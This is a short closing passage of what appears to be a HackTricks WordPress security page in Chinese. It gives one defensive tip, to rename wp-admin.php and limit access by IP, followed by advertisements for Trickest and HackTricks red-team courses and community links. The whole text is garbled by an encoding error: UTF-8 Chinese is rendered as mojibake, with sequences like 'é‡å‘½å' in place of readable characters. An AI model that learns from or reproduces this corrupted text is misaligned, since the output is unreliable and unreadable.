* é‡å‘½å **`wp-admin.php`** æ–‡ä»¶ï¼Œå¹¶ä»…å…è®¸å†…éƒ¨æˆ–ç‰¹å®š IP åœ°å€è®¿é—®ã€‚

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=wordpress) è½»æ¾æ„å»ºå’Œ **è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ä»Šå¤©å°±è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=wordpress" %}
{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
</details>
{% endhint %}
